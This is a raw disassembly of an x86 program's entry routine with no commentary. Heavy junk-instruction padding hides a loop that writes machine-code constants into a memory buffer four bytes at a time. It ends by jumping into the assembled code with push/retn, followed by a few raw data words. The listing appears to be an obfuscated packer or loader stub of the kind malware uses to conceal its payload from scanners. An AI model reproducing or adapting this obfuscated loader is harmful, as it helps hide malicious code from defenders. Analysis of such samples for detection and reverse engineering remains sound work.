		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	ax, ax
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 40DBEC91h
		movzx	ecx, al
		mov	si, si
		sub	esi, offset word_40F9EA
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		mov	si, si
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0B2D23300h
		sub	esi, offset word_40F9EA
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xchg	eax, esi
		test	esi, offset byte_40DA7F
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 24540104h
		test	esi, offset byte_40DA7F
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		lea	ebp, byte_40DB69[edx]
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0EC918D9Ch
		movzx	ebx, ch
		movsx	ecx, cl
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		movsx	ecx, cl
		xadd	eax, ebp
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 8B0040DBh
		xadd	eax, ebp
		xor	edx, offset byte_40DFFD
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	edx, offset byte_40DFFD
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 819C245Ch
		sub	esi, eax
		or	edx, eax
		test	edi, edi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	edx, eax
		test	edi, edi
		test	di, ax
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 9B4E8803h
		test	edi, edi
		test	di, ax
		imul	edi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		test	di, ax
		imul	edi
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 3338141h
		imul	edi
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		and	bx, di
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0F4710B6h
		xor	ecx, ebp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	bx, ax
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 8103D8ACh
		or	edx, offset byte_40FEE9
		movsx	ecx, ch
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		movsx	ecx, ch
		mov	edi, [esp+var_64]
		mov	eax, 40D86CE9h
		stosd
		not	edx
		test	edx, offset byte_40FC7D
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	edx, offset byte_40FC7D
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 0B0C03300h
		or	dx, ax
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	si, ax
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 24440104h
		and	cx, si
		or	edx, edi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	edx, edi
		mov	edx, ebp
		test	edi, ecx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 6CE9819Ch
		mov	edx, ebp
		test	edi, ecx
		add	cx, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		test	edi, ecx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 8B0040D8h
		add	cx, di
		movzx	ecx, ah
		test	bx, ax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		movzx	ecx, ah
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 819C244Ch
		test	bx, ax
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	cx, si
		mov	edi, [esp+var_64]
		mov	eax, 8BD23301h
		stosd
		and	ecx, ebx
		add	eax, ecx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		add	eax, ecx
		xor	esi, offset dword_40DDE8
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 8BDA8B4Eh
		xor	esi, offset dword_40DDE8
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		mov	ebp, eax
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 0F8808DDDh
		test	ebp, ebp
		shld	eax, edi, 3
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		shld	eax, edi, 3
		mov	edi, [esp+var_64]
		mov	eax, 330040FBh
		stosd
		lea	ecx, [ebx+2]
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sbb	edi, offset byte_40FEEB
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 104B0C0h
		lea	ebp, byte_40DB69[edx]
		or	dx, ax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		or	dx, ax
		shr	eax, 2
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 8B9C2444h
		shr	eax, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	eax, eax
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 24548BDDh
		or	ax, dx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	ax, ax
		or	di, bx
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 102819Ch
		or	di, bx
		test	cx, dx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	cx, dx
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 8D03F9F7h
		lea	edx, byte_40F86F[ebx]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	ecx, dword_40FAE8[ecx]
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 40FBF880h
		mov	bx, dx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	edi, edi
		add	edx, esi
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0B1C93300h
		add	edx, esi
		test	ebp, ebx
		and	ecx, eax
		mov	di, cx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	ebp, ebx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 244C0104h
		and	ecx, eax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		mov	di, cx
		movsx	ebx, dl
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0C323669Ch
		movsx	ebx, dl
		sub	ebp, edx
		mov	dx, ax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	ebp, edx
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 9C244C8Bh
		mov	dx, ax
		add	bp, cx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	bp, cx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0FE9C0181h
		add	di, bx
		xadd	eax, ebx
		movzx	ebx, al
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xadd	eax, ebx
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 3181F45Eh
		movzx	ebx, al
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	edi, edx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 0E3D7B84Dh
		imul	eax
		shl	ebx, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		shl	ebx, 2
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 83C8C10Fh
		sub	edx, esi
		test	bx, bp
		mov	ecx, ebp
		and	ebp, ecx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		test	bx, bp
		mov	ecx, ebp
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0B6602DBh
		mov	ecx, ebp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ebp, ecx
		lea	esi, [edi+2]
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 0B3DB33F8h
		lea	esi, [edi+2]
		sbb	ebp, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sbb	ebp, 2
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 245C0104h
		sub	edi, ebp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	esi, ecx
		mov	edi, [esp+var_64]
		mov	eax, 2DB839Ch
		stosd
		mov	di, ax
		sub	ebp, ebx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	ebp, ebx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 8BF80B66h
		and	edi, ebp
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	esi, edi
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 819C2444h
		movzx	ecx, ah
		movzx	eax, cl
		and	bp, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movzx	eax, cl
		and	bp, dx
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 0BC400300h
		and	bp, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	di, cx
		mov	edx, [esp+var_64]
		add	dword ptr [edx], 30812Bh
		sub	edi, offset byte_40FAEF
		shl	edi, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		shl	edi, 2
		sub	ecx, eax
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 66F697BDh
		sub	ecx, eax
		or	ebx, ebx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		or	ebx, ebx
		test	esi, edi
		sub	cx, dx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 0DB33F80Bh
		test	esi, edi
		sub	cx, dx
		sbb	ebx, 2
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	cx, dx
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 5C0104B3h
		sbb	ebx, 2
		xor	bp, ax
		lea	ebp, [ebx+2]
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		xor	bp, ax
		lea	ebp, [ebx+2]
		mov	edi, [esp+var_64]
		mov	eax, 0DF859C24h
		stosd
		lea	ebp, [ebx+2]
		add	ecx, edx
		xor	edx, ebp
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	ecx, edx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 9C245C8Bh
		xor	edx, ebp
		test	si, bx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		test	si, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 0EC750381h
		test	bp, ax
		mov	ax, si
		and	esi, offset word_40F8FA
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	ax, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 828D5F5Bh
		and	esi, offset word_40F8FA
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	ecx, ecx
		xor	si, ax
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], offset	dword_40D968
		xor	si, ax
		or	edx, edx
		xor	bx, bp
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		or	edx, edx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 4B2D233h
		xor	bx, bp
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		shld	eax, edx, 3
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 9C245401h
		sub	eax, esi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	edx, ecx
		mov	di, bx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 448BFF2Bh
		mov	di, bx
		shld	eax, edx, 3
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		shld	eax, edx, 3
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 819C24h
		lea	edi, word_40FD7E[eax]
		xor	di, dx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	di, dx
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 390D52FBh
		neg	edx
		add	eax, esi
		and	dx, dx
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		add	eax, esi
		and	dx, dx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0A5703081h
		and	dx, dx
		lea	esi, byte_40DFFC[esi]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	esi, byte_40DFFC[esi]
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 3366B85Bh
		add	edi, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	bp, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0B3DB33D6h
		mov	bx, dx
		add	ecx, ecx
		test	si, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	ecx, ecx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 245C0104h
		test	si, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	0D003669Ch
		mov	esi, esp
		movsd
		pop	eax
		test	ax, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ax, si
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 9C245C8Bh
		test	edi, eax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	ebx, ecx
		mov	ecx, edx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0C70381h
		mov	ecx, edx
		mov	ebx, esi
		movzx	eax, dh
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	ebx, esi
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0FA8B0001h
		movzx	eax, dh
		test	eax, eax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	eax, eax
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 4B1C933h
		mov	bp, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	bp, ax
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 9C244C01h
		sub	bx, bx
		and	bp, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	bp, bx
		test	ax, si
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0C10FD30Bh
		test	ax, si
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	di, dx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 245C8BC0h
		rcl	edx, 2
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	edx, ebp
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0E303819Ch
		xor	si, cx
		mov	ecx, ebp
		add	dx, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	ecx, ebp
		add	dx, cx
		mov	edi, [esp+var_64]
		mov	eax, 81830EB8h
		stosd
		add	dx, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		shr	ebx, 2
		mov	edi, [esp+var_64]
		mov	eax, 85EBE333h
		stosd
		lea	ebx, [edi+2]
		xor	ecx, esi
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	0C0C10F85h
		mov	esi, esp
		movsd
		pop	eax
		lea	eax, [ebp+2]
		lea	esi, [ebp+2]
		mov	edi, offset dword_40DBEC
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	esi, [ebp+2]
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 4B1C933h
		mov	edi, offset dword_40DBEC
		test	bx, ax
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		test	bx, ax
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 9C244C01h
		sub	di, di
		xor	edx, edi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	edx, edi
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 66C70366h
		xor	ecx, esi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	448BF885h
		mov	esi, esp
		movsd
		pop	eax
		xor	ecx, esi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	819C24h
		mov	esi, esp
		movsd
		pop	eax
		xor	ecx, esi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	4E8BD233h
		mov	esi, esp
		movsd
		pop	eax
		xor	ecx, esi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	33F88566h
		mov	esi, esp
		movsd
		pop	eax
		xor	ecx, esi
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	ecx, 2
		mov	edi, [esp+var_64]
		push	104B3DBh
		mov	esi, esp
		movsd
		pop	eax
		test	ebx, edi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	bp, ax
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 0C19C245Ch
		test	edx, ecx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	di, bx
		add	ebx, ecx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 448B02E5h
		add	ebx, ecx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	ecx, ebx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 819C24h
		test	ax, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ax, si
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 3F9F701h
		sub	di, di
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	bx, dx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0D823DD8Bh
		imul	eax
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	eax, 2
		neg	eax
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0EA33F203h
		neg	eax
		lea	ebp, byte_40FBFB[eax]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	ebp, byte_40FBFB[eax]
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 4B2D233h
		add	ebx, ecx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	ecx, ebx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 9C245401h
		test	edi, edi
		sbb	esi, offset byte_40DC7F
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sbb	esi, offset byte_40DC7F
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 448BD823h
		test	si, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	819C24h
		mov	esi, esp
		movsd
		pop	eax
		test	ax, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ax, si
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 178946D1h
		or	si, cx
		and	ax, si
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	ax, si
		mov	edi, [esp+var_64]
		mov	eax, 0EA33F203h
		stosd
		sub	ebp, eax
		mov	edi, offset dword_40DBEC
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	edi, offset dword_40DBEC
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0DA6EDD81h
		movzx	eax, dh
		test	eax, eax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	eax, eax
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0C9330040h
		add	ecx, ebx
		sub	ecx, esi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	ecx, esi
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 4C0104B1h
		sub	bx, bx
		and	bp, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	bp, bx
		and	dx, ax
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0EA339C24h
		and	dx, ax
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		sub	bx, bx
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 9C24548Bh
		movzx	ebx, cl
		lea	esi, [edx+2]
		test	bp, cx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	esi, [edx+2]
		test	bp, cx
		mov	edi, [esp+var_64]
		mov	eax, 0FD030281h
		stosd
		test	bp, cx
		lea	esi, [edx+2]
		sub	bx, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	esi, [edx+2]
		sub	bx, bx
		mov	edi, [esp+var_64]
		mov	eax, 0DD81DD2Bh
		stosd
		sub	bx, bx
		and	bp, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	bp, bx
		movzx	eax, al
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], offset	word_40DA6E
		movzx	eax, al
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	ecx, esi
		mov	edi, [esp+var_64]
		push	4B0C033h
		mov	esi, esp
		movsd
		pop	eax
		lea	edx, byte_40D87F[edi]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	esi, [edx+2]
		and	dx, bx
		mov	edi, [esp+var_64]
		mov	eax, 9C244401h
		stosd
		and	dx, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xchg	eax, ebx
		test	ebx, ebx
		add	dx, bp
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 548BE0F7h
		test	ebx, ebx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	dx, bp
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 2819C24h
		add	eax, edx
		add	di, bp
		lea	ecx, byte_40DE7B[edx]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	di, bp
		mov	edx, [esp+var_64]
		mov	dword ptr [edx], 5E5BEC75h
		lea	ecx, byte_40DE7B[edx]
		lea	ecx, [eax+2]
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		lea	ecx, [eax+2]
		lea	ebp, [edx+2]
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0DB33DB03h
		lea	ebp, [edx+2]
		sub	si, di
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		sub	si, di
		xor	eax, ecx
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 5C0104B3h
		xor	eax, ecx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		or	bp, bx
		sub	si, dx
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0B669C24h
		sub	si, dx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		movsx	ecx, bl
		movzx	ecx, ch
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 245C8BF3h
		movzx	ecx, ch
		test	ebx, eax
		sub	dx, bx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	ebx, eax
		sub	dx, bx
		mov	ecx, [esp+var_64]
		add	dword ptr [ecx], 5F03819Ch
		sub	dx, bx
		rol	eax, 2
		xor	bp, si
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		rol	eax, 2
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 6633048Bh
		xor	bp, si
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	cx, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0EA2BF62Bh
		mov	ebp, esi
		xor	bx, dx
		mov	ebp, edx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	bx, dx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 33C92366h
		mov	ebp, edx
		xor	ebp, edi
		add	ebp, offset byte_40F9E8
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	ebp, edi
		add	ebp, offset byte_40F9E8
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 104B2D2h
		add	ebp, offset byte_40F9E8
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		and	bp, bx
		add	dx, cx
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 2B9C2454h
		add	dx, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		xor	esi, edi
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 0C92366EAh
		and	ecx, offset byte_40F97F
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	bp, bp
		mov	ebx, [esp+var_64]
		mov	dword ptr [ebx], 9C245C8Bh
		lea	esi, [ecx+2]
		add	ecx, edx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	ecx, edx
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 44310381h
		test	ax, bp
		sub	edx, ebx
		xor	si, cx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	edx, ebx
		xor	si, cx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 2366FC3Bh
		xor	si, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		shld	eax, eax, 3
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 0B1C933C9h
		lea	edi, [edx+2]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		mov	edx, ebp
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 244C0104h
		xor	si, cx
		mov	ecx, ebp
		test	eax, edx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		mov	ecx, ebp
		test	eax, edx
		mov	edi, [esp+var_64]
		mov	eax, 0CD33669Ch
		stosd
		test	eax, edx
		test	bp, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	bp, cx
		movsx	eax, al
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 448BDA0Bh
		movsx	eax, al
		sub	esi, ebx
		sub	bx, bx
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		sub	esi, ebx
		sub	bx, bx
		mov	eax, [esp+var_64]
		or	dword ptr [eax], 819C24h
		sub	bx, bx
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	eax, ebx
		mov	bx, ax
		mov	edx, [esp+var_64]
		or	dword ptr [edx], 0F575DD2Bh
		mov	bx, ax
		xor	edx, edx
		mov	dl, 4
		add	[esp+var_64], edx
		xor	si, bx
		xor	bp, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0C933DA0Bh
		xor	bp, si
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	cx, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 4C0104B1h
		lea	eax, [ebp+2]
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		add	edi, ecx
		mov	edi, [esp+var_64]
		push	0BE0F9C24h
		mov	esi, esp
		movsd
		pop	eax
		mov	ecx, offset word_40DAEE
		xor	ebp, edi
		ror	ebx, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		xor	ebp, edi
		ror	ebx, 2
		mov	ebx, [esp+var_64]
		add	dword ptr [ebx], 244C8BCEh
		ror	ebx, 2
		add	edi, ecx
		add	edx, 2
		xor	ebx, ebx
		mov	bl, 4
		add	[esp+var_64], ebx
		add	edi, ecx
		mov	edi, [esp+var_64]
		push	6101819Ch
		mov	esi, esp
		movsd
		pop	eax
		add	edx, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		sub	eax, esi
		or	esi, esi
		mov	ecx, [esp+var_64]
		mov	dword ptr [ecx], 668B55C3h
		or	esi, esi
		test	eax, ebp
		sub	ecx, edi
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		test	eax, ebp
		mov	edi, [esp+var_64]
		mov	eax, 0F823D023h
		stosd
		sub	ecx, edi
		and	bp, si
		mov	si, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		and	bp, si
		mov	eax, [esp+var_64]
		mov	dword ptr [eax], 4B3DB33h
		mov	si, cx
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		add	edi, ecx
		mov	edi, [esp+var_64]
		push	9C245C01h
		mov	esi, esp
		movsd
		pop	eax
		test	si, dx
		and	ebp, offset byte_40DBE8
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		and	ebp, offset byte_40DBE8
		mov	ebx, [esp+var_64]
		or	dword ptr [ebx], 4064AA68h
		add	edx, 2
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		or	bp, si
		mov	eax, [esp+var_64]
		add	dword ptr [eax], 0F823C300h
		lea	edi, byte_40F87D[ebp]
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		lea	ebx, word_40FD7E[ebp]
		mov	ecx, [esp+var_64]
		or	dword ptr [ecx], 0C681D68Bh
		or	di, di
		xor	eax, eax
		mov	al, 4
		add	[esp+var_64], eax
		lea	eax, [ebx+2]
		mov	eax, [esp+var_64]
		add	dword ptr [eax], offset	word_40FF7E
		xor	bp, si
		xor	ecx, ecx
		mov	cl, 4
		add	[esp+var_64], ecx
		push	offset word_4094AA
		retn
start		endp

; ---------------------------------------------------------------------------
		dw 2366h
		dd 0C62366CEh, 3E8A40Fh, 7CF430FBh, 52513745h, 9B32A486h
		dd 0BFDF4416h, 0C99878BBh, 0DD7296DCh, 0C06D5CD7h, 1B2C169Ch
